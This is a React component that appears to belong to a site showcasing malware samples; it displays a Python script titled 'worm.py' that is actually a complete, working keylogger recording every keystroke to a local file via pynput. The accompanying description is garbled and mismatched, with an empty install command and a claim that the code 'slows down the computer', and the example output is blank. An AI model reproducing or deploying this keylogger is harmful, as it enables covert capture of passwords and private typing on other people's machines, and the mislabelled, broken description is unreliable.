import React, { useState, useEffect } from 'react';
import '../filedisplay.css';

const FileDisplaykey = () => {

  return (
    <div className="file-display-container">
      <div className="file-display-item">
        <h2 className="file-display-heading">worm.py</h2>
        <pre className="file-display-content">
          <code>
            {`
# Import necessary packages
from pynput.keyboard import Key, Listener
import logging
import os

# Set the directory and filename for the log file
log_dir = os.getcwd() + "/"
log_file = log_dir + "keylogging.txt"

# Configure the logger to write to the log file
logging.basicConfig(filename=log_file,
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the function to be called when a key is pressed
def on_press(key):
    logging.info(str(key)) # Write the key to the log file

# Start a listener to monitor key presses
with Listener(on_press=on_press) as listener:
    try:
        listener.join() # Wait for the listener to end
    except KeyboardInterrupt:
        pass # If the user interrupts the program, exit 

            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Example Output</h2>
        <pre className="file-display-content">
          <code>
            {`

            `}
          </code>
        </pre>
      </div>
      <div className="file-display-item">
        <h2 className="file-display-heading">Description</h2>
        <p className="file-display-description">Install using: pip install 
        <br/>File location may be changed<br/><br/>
        The code imports necessary packages, slows down the computer
        </p>
      </div>
    </div>
  );
};

export default FileDisplaykey;
